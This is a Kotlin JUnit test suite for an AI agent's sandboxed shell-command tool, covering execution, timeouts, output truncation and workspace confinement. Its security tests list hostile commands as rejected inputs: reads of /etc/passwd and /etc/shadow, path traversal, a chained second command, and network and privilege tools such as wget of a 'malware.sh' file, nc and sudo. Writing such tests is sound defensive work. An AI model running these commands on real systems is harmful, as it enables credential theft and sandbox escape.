package com.example.agent.tools

import com.example.agent.tools.command.CommandExecutionResult
import com.example.agent.tools.command.CommandRunner
import com.example.agent.tools.command.CommandSecurityValidator
import com.example.agent.tools.command.ProcessCommandRunner
import com.example.agent.tools.command.RunCommandTool
import com.example.agent.tools.workspace.AgentWorkspaceManager
import com.example.agent.tools.workspace.FileWriteTool
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import java.io.File
import java.nio.file.Files

class RunCommandToolTest {

    private lateinit var tempBaseDir: File
    private lateinit var workspaceManager: AgentWorkspaceManager
    private lateinit var runCommandTool: RunCommandTool
    private lateinit var writeTool: FileWriteTool
    private lateinit var registry: ToolRegistry

    @Before
    fun setUp() {
        tempBaseDir = Files.createTempDirectory("run_command_test_").toFile()
        workspaceManager = AgentWorkspaceManager(tempBaseDir)
        workspaceManager.activeSessionId = "session_cmd_test"

        runCommandTool = RunCommandTool(workspaceManager)
        writeTool = FileWriteTool(workspaceManager)
        registry = ToolRegistry.defaultRegistry(workspaceManager)
    }

    @After
    fun tearDown() {
        tempBaseDir.deleteRecursively()
    }

    @Test
    fun testToolRegistrationAndPromptDiscovery() {
        val tool = registry.getTool("run_command")
        assertNotNull("run_command tool must be registered in defaultRegistry", tool)
        assertEquals("run_command", tool?.definition?.name)

        val promptInstructions = registry.formatToolsForPrompt()
        assertTrue("Prompt must include run_command", promptInstructions.contains("run_command"))
        assertTrue("Prompt must list command parameter", promptInstructions.contains("command"))
    }

    @Test
    fun testSuccessfulEchoAndDirectoryListing() = runBlocking {
        // Echo test
        val echoResult = runCommandTool.execute(
            mapOf("command" to "echo 'Hello Agent Workspace'")
        )
        assertTrue("Echo command should succeed: ${echoResult.error}", echoResult.isSuccess)
        assertNotNull(echoResult.result)
        assertTrue("Output should contain echoed text", echoResult.result!!.contains("Hello Agent Workspace"))
        assertTrue("Result should report Exit Code: 0", echoResult.result!!.contains("Exit Code: 0"))

        // Create sample files in workspace
        writeTool.execute(mapOf("path" to "file1.txt", "content" to "Alpha"))
        writeTool.execute(mapOf("path" to "file2.txt", "content" to "Beta"))

        // Directory listing test
        val lsResult = runCommandTool.execute(
            mapOf("command" to "ls")
        )
        assertTrue("ls command should succeed: ${lsResult.error}", lsResult.isSuccess)
        assertTrue(lsResult.result!!.contains("file1.txt"))
        assertTrue(lsResult.result!!.contains("file2.txt"))
    }

    @Test
    fun testFileInspectionAndPipes() = runBlocking {
        writeTool.execute(
            mapOf(
                "path" to "notes.txt",
                "content" to "Line 1: NVIDIA GPU\nLine 2: Mobile Agent\nLine 3: DeepSeek AI"
            )
        )

        // Cat test
        val catResult = runCommandTool.execute(
            mapOf("command" to "cat notes.txt")
        )
        assertTrue(catResult.isSuccess)
        assertTrue(catResult.result!!.contains("NVIDIA GPU"))
        assertTrue(catResult.result!!.contains("DeepSeek AI"))

        // Chained pipeline test (cat + grep)
        val pipeResult = runCommandTool.execute(
            mapOf("command" to "cat notes.txt | grep Mobile")
        )
        assertTrue(pipeResult.isSuccess)
        assertTrue(pipeResult.result!!.contains("Line 2: Mobile Agent"))
        assertFalse(pipeResult.result!!.contains("Line 1: NVIDIA GPU"))

        // wc test
        val wcResult = runCommandTool.execute(
            mapOf("command" to "wc -l notes.txt")
        )
        assertTrue(wcResult.isSuccess)
        assertTrue(wcResult.result!!.contains("3"))
    }

    @Test
    fun testCustomWorkingDirectoryExecution() = runBlocking {
        val workspaceRoot = workspaceManager.getWorkspaceDir()
        val subDir = File(workspaceRoot, "subdir").apply { mkdirs() }
        File(subDir, "inner.txt").writeText("Inner Content")

        val result = runCommandTool.execute(
            mapOf(
                "command" to "cat inner.txt",
                "working_dir" to "subdir"
            )
        )
        assertTrue("Command in subdirectory should succeed: ${result.error}", result.isSuccess)
        assertTrue(result.result!!.contains("Inner Content"))
        assertTrue(result.result!!.contains("Working Directory: subdir"))
    }

    @Test
    fun testBasicScriptExecution() = runBlocking {
        // Create an executable workspace script
        val scriptContent = """
            #!/bin/sh
            echo "Running automated workspace script"
            echo "Step complete"
        """.trimIndent()

        writeTool.execute(mapOf("path" to "run_task.sh", "content" to scriptContent))

        val result = runCommandTool.execute(
            mapOf("command" to "sh run_task.sh")
        )
        assertTrue("Script execution should succeed: ${result.error}", result.isSuccess)
        assertTrue(result.result!!.contains("Running automated workspace script"))
        assertTrue(result.result!!.contains("Step complete"))
    }

    @Test
    fun testFailedCommandNonZeroExitCode() = runBlocking {
        // Cat nonexistent file
        val result = runCommandTool.execute(
            mapOf("command" to "cat nonexistent_file_98765.txt")
        )
        assertFalse("Command with non-existent file should fail", result.isSuccess)
        assertNotNull(result.error)
        assertTrue("Error should report non-zero exit code", result.error!!.contains("Command exited with code"))
        assertTrue("Error should capture stderr or details", result.error!!.contains("nonexistent_file_98765.txt"))
    }

    @Test
    fun testExecutionTimeoutTerminatesProcess() = runBlocking {
        // Run sleep command that exceeds a tiny timeout
        val result = runCommandTool.execute(
            mapOf(
                "command" to "sleep 5",
                "timeout_ms" to 150
            )
        )
        assertFalse("Command exceeding timeout should fail", result.isSuccess)
        assertNotNull(result.error)
        assertTrue(
            "Error must indicate timeout and termination",
            result.error!!.contains("timed out") && result.error!!.contains("killed")
        )
    }

    @Test
    fun testOversizedOutputTruncation() = runBlocking {
        // Generate output larger than max_output_bytes limit (min limit is 1024 bytes)
        val result = runCommandTool.execute(
            mapOf(
                "command" to "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40; do echo \"Line \$i: Sample benchmark log statement with padding text that exceeds byte buffer size easily\"; done",
                "max_output_bytes" to 1024
            )
        )
        assertTrue("Execution should succeed even with size constraints: ${result.error}", result.isSuccess)
        assertNotNull(result.result)
        assertTrue("Output should indicate truncation: ${result.result}", result.result!!.contains("Output truncated"))
    }

    @Test
    fun testInvalidWorkingDirectoryHandling() = runBlocking {
        // 1. Non-existent working directory
        val nonExistentResult = runCommandTool.execute(
            mapOf(
                "command" to "ls",
                "working_dir" to "non_existent_folder_abc"
            )
        )
        assertFalse(nonExistentResult.isSuccess)
        assertTrue(
            "Should fail on non-existent directory",
            nonExistentResult.error!!.contains("Working directory does not exist")
        )

        // 2. Working directory that is a file rather than a directory
        writeTool.execute(mapOf("path" to "regular_file.txt", "content" to "I am a file"))
        val fileAsDirResult = runCommandTool.execute(
            mapOf(
                "command" to "ls",
                "working_dir" to "regular_file.txt"
            )
        )
        assertFalse(fileAsDirResult.isSuccess)
        assertTrue(
            "Should fail when path is a file",
            fileAsDirResult.error!!.contains("not a directory")
        )
    }

    @Test
    fun testWorkingDirectoryEscapeAttemptsPrevented() = runBlocking {
        // Relative path traversal in working_dir
        val traversalDirResult = runCommandTool.execute(
            mapOf(
                "command" to "ls",
                "working_dir" to "../../"
            )
        )
        assertFalse("Traversal in working_dir must be rejected", traversalDirResult.isSuccess)
        assertTrue(
            "Security error required on working_dir traversal",
            traversalDirResult.error!!.contains("escapes", ignoreCase = true) ||
            traversalDirResult.error!!.contains("security", ignoreCase = true)
        )

        // Absolute path outside workspace in working_dir
        val absoluteDirResult = runCommandTool.execute(
            mapOf(
                "command" to "ls",
                "working_dir" to "/etc"
            )
        )
        assertFalse("Absolute system path in working_dir must be rejected", absoluteDirResult.isSuccess)
    }

    @Test
    fun testSystemFileAccessEscapeAttemptsPrevented() = runBlocking {
        // Attempt to read sensitive system files
        val targets = listOf(
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /system/build.prop",
            "cat /proc/version",
            "cat /sys/class/net",
            "ls /data",
            "cat /dev/null; cat /etc/hosts"
        )

        for (cmd in targets) {
            val result = runCommandTool.execute(mapOf("command" to cmd))
            assertFalse("Command '$cmd' must be rejected by security policy", result.isSuccess)
            assertTrue(
                "Error for '$cmd' should indicate security/prohibited path",
                result.error!!.contains("prohibited") ||
                result.error!!.contains("security") ||
                result.error!!.contains("Security validation failed")
            )
        }
    }

    @Test
    fun testCommandPathTraversalEscapeAttemptsPrevented() = runBlocking {
        // Path traversal in arguments
        val traversalCommands = listOf(
            "cat ../../escaped_secret.txt",
            "ls ../../",
            "head -n 5 ../../../etc/passwd",
            "cat file.txt | grep test > ../../stolen.txt"
        )

        for (cmd in traversalCommands) {
            val result = runCommandTool.execute(mapOf("command" to cmd))
            assertFalse("Command with traversal '$cmd' must be rejected", result.isSuccess)
            assertTrue(
                "Error for '$cmd' should indicate traversal attempt",
                result.error!!.contains("traversal") ||
                result.error!!.contains("Security validation failed") ||
                result.error!!.contains("escapes")
            )
        }
    }

    @Test
    fun testDisallowedCommandsPrevented() = runBlocking {
        // Privilege escalation, network scanning, package management
        val forbidden = listOf(
            "su",
            "sudo ls",
            "curl https://example.com",
            "wget https://example.com/malware.sh",
            "nc -l 8080",
            "nmap 192.168.1.1",
            "ping 8.8.8.8",
            "apt install htop",
            "apt-get update",
            "pm install /sdcard/bad.apk",
            "dumpsys",
            "chroot /",
            "reboot"
        )

        for (cmd in forbidden) {
            val result = runCommandTool.execute(mapOf("command" to cmd))
            assertFalse("Forbidden command '$cmd' must be rejected", result.isSuccess)
            assertTrue(
                "Error for '$cmd' should cite security rejection",
                result.error!!.contains("forbidden") ||
                result.error!!.contains("not permitted") ||
                result.error!!.contains("Security validation failed")
            )
        }
    }

    @Test
    fun testModularRunnerSubstitution() = runBlocking {
        // Verify modularity: a mock or custom container runner can replace ProcessCommandRunner
        val customMockRunner = object : CommandRunner {
            override suspend fun run(
                command: String,
                workingDir: File,
                timeoutMs: Long,
                maxOutputBytes: Int
            ): CommandExecutionResult {
                return CommandExecutionResult(
                    exitCode = 0,
                    stdout = "SANDBOX_MOCK_OUTPUT: $command in ${workingDir.name}",
                    stderr = "",
                    durationMs = 42L,
                    isTimedOut = false,
                    isTruncated = false
                )
            }
        }

        val sandboxedTool = RunCommandTool(
            workspaceManager = workspaceManager,
            commandRunner = customMockRunner,
            securityValidator = CommandSecurityValidator()
        )

        val result = sandboxedTool.execute(mapOf("command" to "ls"))
        assertTrue(result.isSuccess)
        assertTrue(result.result!!.contains("SANDBOX_MOCK_OUTPUT: ls in session_cmd_test"))
        assertTrue(result.result!!.contains("Duration: 42ms"))
    }
}
